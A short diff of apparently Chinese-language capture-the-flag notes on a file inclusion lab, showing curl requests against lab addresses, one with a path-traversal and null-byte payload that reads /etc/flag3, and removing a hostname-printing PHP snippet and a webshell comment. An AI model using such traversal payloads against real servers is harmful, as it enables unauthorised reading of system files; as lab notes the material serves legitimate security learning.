@@ -30,15 +30,4 @@
 4.curl命令
 > curl -X POST http://10.10.7.7/challenges//chall1.php -d 'method=GET&file=/etc/flag1'
 
-curl -X POST http://10.10.189.219/challenges//chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
-
-php输出主机名
-```php
-<?php
-// 获取并输出主机名
-$hostname = php_uname('n');
-echo "Hostname: $hostname";
-?>
- ```
-
- // php webshell
+> curl -X POST http://10.10.189.219/challenges//chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
